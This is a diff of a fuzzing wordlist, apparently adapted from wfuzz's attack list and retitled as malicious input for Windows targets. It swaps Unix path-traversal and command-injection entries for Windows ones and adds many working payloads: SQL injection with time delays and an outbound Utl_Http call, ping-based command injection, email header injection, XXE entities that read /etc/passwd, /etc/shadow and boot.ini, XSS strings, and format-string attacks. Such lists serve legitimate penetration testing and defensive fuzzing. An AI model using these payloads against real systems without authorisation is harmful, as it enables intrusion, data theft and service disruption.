@@ -1,4 +1,4 @@
-# all_attacks.txt from wfuzz
+# a wide sample of malicious input for windows targets
 A
 TRUE
 FALSE
@@ -32,82 +32,28 @@ null
 \00\00\00
 $null
 $NULL
-`id`
 `dir`
-;id;
-;read;
-;netstat -a;
 \nnetstat -a%\n
 \"blah
-|id|
+|dir|
 &quot;;id&quot;
-id%00
-id%00|
-|id
+dir%00
+dir%00|
 |dir
 |dir|
-|ls
-|ls -la
-;ls -la
-;dir
 |/bin/ls -al
-\n/bin/ls -al\n
 ?x=
 ?x="
 ?x=|
 ?x=>
-/index.html|id|
 /boot.ini
-/etc/passwd
-/etc/shadow
 ABCD|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|
-../../../../../../../../../../../../etc/hosts%00
-../../../../../../../../../../../../etc/hosts
 ../../boot.ini
 /../../../../../../../../%2A
-../../../../../../../../../../../../etc/passwd%00
-../../../../../../../../../../../../etc/passwd
-../../../../../../../../../../../../etc/shadow%00
-../../../../../../../../../../../../etc/shadow
-/../../../../../../../../../../etc/passwd^^
-/../../../../../../../../../../etc/shadow^^
-/../../../../../../../../../../etc/passwd
-/../../../../../../../../../../etc/shadow
-/./././././././././././etc/passwd
-/./././././././././././etc/shadow
-\..\..\..\..\..\..\..\..\..\..\etc\passwd
-\..\..\..\..\..\..\..\..\..\..\etc\shadow
-..\..\..\..\..\..\..\..\..\..\etc\passwd
-..\..\..\..\..\..\..\..\..\..\etc\shadow
-/..\../..\../..\../..\../..\../..\../etc/passwd
-/..\../..\../..\../..\../..\../..\../etc/shadow
-.\\./.\\./.\\./.\\./.\\./.\\./etc/passwd
-.\\./.\\./.\\./.\\./.\\./.\\./etc/shadow
-\..\..\..\..\..\..\..\..\..\..\etc\passwd%00
-\..\..\..\..\..\..\..\..\..\..\etc\shadow%00
-..\..\..\..\..\..\..\..\..\..\etc\passwd%00
-..\..\..\..\..\..\..\..\..\..\etc\shadow%00
-%0a/bin/cat%20/etc/passwd
-%0a/bin/cat%20/etc/shadow
-%00/etc/passwd%00
-%00/etc/shadow%00
-%00../../../../../../etc/passwd
-%00../../../../../../etc/shadow
-/../../../../../../../../../../../etc/passwd%00.jpg
-/../../../../../../../../../../../etc/passwd%00.html
-/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd
-/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow
-/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
-/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow
-%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00
-/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00
 %25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%	25%5c..%25%5c..%00
 %25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%		25%5c..%25%5c..%255cboot.ini
 /%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..winnt/desktop.ini
-\\&apos;/bin/cat%20/etc/passwd\\&apos;
-\\&apos;/bin/cat%20/etc/shadow\\&apos;
 ../../../../../../../../conf/server.xml
-/../../../../../../../../bin/id|
 C:/inetpub/wwwroot/global.asa
 C:\inetpub\wwwroot\global.asa
 C:/boot.ini
@@ -133,8 +79,8 @@ C:\boot.ini
 !@#0%^#0##018387@#0^^**(()
 %01%02%03%04%0a%0d%0aADSF
 /,%ENV,/
-&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
-&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
+&lt;!--#exec%20cmd=&quot;dir&quot;--&gt;
+&lt;!--#exec%20cmd=&quot;dir&quot;--&gt;
 %
 #
 *
@@ -468,3 +414,118 @@ x' or name()='username' or 'x'='y
 <xml ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></xml><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
 <xml SRC="xsstest.xml" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
 <HTML xmlns:xss><?import namespace="xss" implementation="http://ha.ckers.org/xss.htc"><xss:xss>XSS</xss:xss></HTML>
+
+'
+'--
+' or 1=1--
+1 or 1=1--
+' or 1 in (@@version)--
+1 or 1 in (@@version)--
+'; waitfor delay '0:30:0'--
+1; waitfor delay '0:30:0'--
+'||Utl_Http.request('http://<yourservername>') from dual--
+1||Utl_Http.request('http://<yourservername>') from dual--
+xsstest
+xsstest%00"<>'
+</foo>
+<foo></foo>
+))))))))))
+../../../../../../../../../../boot.ini
+..\..\..\..\..\..\..\..\..\..\boot.ini
+../../../../../../../../../../windows/win.ini
+..\..\..\..\..\..\..\..\..\..\windows\win.ini
+|| ping -i 30 127.0.0.1 ; x || ping -n 30 127.0.0.1 &
+| ping -i 30 127.0.0.1 |
+| ping -n 30 127.0.0.1 |
+& ping -i 30 127.0.0.1 &
+& ping -n 30 127.0.0.1 &
+; ping 127.0.0.1 ;
+%0a ping -i 30 127.0.0.1 %0a
+`ping 127.0.0.1`
+;echo 111111
+echo 111111
+response.write 111111
+:response.write 111111
+http://<yourservername>/
+<youremail>%0aCc:<youremail>
+<youremail>%0d%0aCc:<youremail>
+<youremail>%0aBcc:<youremail>
+<youremail>%0d%0aBcc:<youremail>
+%0aDATA%0afoo%0a%2e%0aMAIL+FROM:+<youremail>%0aRCPT+TO:+<youremail>%0aDATA%0aFrom:+<youremail>%0aTo:+<youremail>%0aSubject:+tst%0afoo%0a%2e%0a
+%0d%0aDATA%0d%0afoo%0d%0a%2e%0d%0aMAIL+FROM:+<youremail>%0d%0aRCPT+TO:+<youremail>%0d%0aDATA%0d%0aFrom:+<youremail>%0d%0aTo:+<youremail>%0d%0aSubject:+test%0d%0afoo%0d%0a%2e%0d%0a
+# known cross platform source Code, file disclosure attack patterns - append after file or dir path
+%70
+.%E2%73%70
+%2e0
+%2e
+.
+\
+?*
+%20
+%00
+%2f
+%5c
+count(/child::node())
+x' or name()='username' or 'x'='y
+<![CDATA[<script>var n=0;while(true){n++;}</script>]]>
+<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>
+"<?xml version=""1.0"" encoding=""ISO-8859-1""?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>"
+"<?xml version=""1.0"" encoding=""ISO-8859-1""?><foo><![CDATA[' or 1=1 or ''=']]></foo>"
+"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file://c:/boot.ini"">]><foo>&xxe;</foo>"
+"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file:////etc/passwd"">]><foo>&xxe;</foo>"
+"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file:////etc/shadow"">]><foo>&xxe;</foo>"
+"<?xml version=""1.0"" encoding=""ISO-8859-1""?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ""file:////dev/random"">]><foo>&xxe;</foo>"
+"<xml ID=I><X><C><![CDATA[<IMG SRC=""javas]]><![CDATA[cript:alert('XSS');"">]]>"
+"<xml ID=""xss""><I><B><IMG SRC=""javas<!-- -->cript:alert('XSS')""></B></I></xml><SPAN DATASRC=""#xss"" DATAFLD=""B"" DATAFORMATAS=""HTML""></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>"
+"<xml SRC=""xsstest.xml"" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>"
+"<HTML xmlns:xss><?import namespace=""xss"" implementation=""http://ha.ckers.org/xss.htc""><xss:xss>XSS</xss:xss></HTML>"
+%00
+NULL
+null
+'
+"
+;
+<!
+-
+=
++
+"
+&
+!
+|
+<
+>
+"><script>alert(1)</script>
+%0d
+%0a
+%7f
+%ff
+-1
+other
+%s%p%x%d
+%99999999999s
+%08x
+%20d
+%20n
+%20x
+%20s
+%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d 
+%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i%i
+%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o%o
+%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u%u
+%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
+%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X%X
+%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a%a
+%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A%A
+%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e%e
+%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E
+%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f%f
+%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F%F
+%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g%g
+%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G%G
+%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s
+%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
+%#0123456x%08x%x%s%p%d%n%o%u%c%h%l%q%j%z%Z%t%i%e%g%f%a%C%S%08x%%
+XXXXX.%p
+XXXXX`perl -e 'print ".%p" x 80'`
+`perl -e 'print ".%p" x 80'`%n
